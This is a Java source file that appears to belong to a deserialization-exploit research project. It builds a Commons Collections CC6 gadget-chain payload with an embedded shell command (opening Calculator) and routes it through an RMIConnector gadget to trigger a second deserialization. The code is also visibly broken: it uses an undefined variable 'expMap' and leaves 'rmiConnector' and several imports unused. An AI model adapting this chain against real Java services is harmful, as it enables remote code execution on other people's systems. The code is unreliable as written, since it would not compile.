package xyz.eki.marshalexp.solution;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.jdk.GRMIConnector;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.util.HashMap;
import java.util.Map;

public class RMIConnectorDualDeserialize {
    public static void main(String[] args)  throws Exception{
        String cmd = "open /System/Applications/Calculator.app";
        Object rmiConnector = GRMIConnector.invokeConnect2Deserialize(new CC6().getPocObject(cmd));

        SerializeUtils.deserialize(SerializeUtils.serialize(expMap));
    }
}
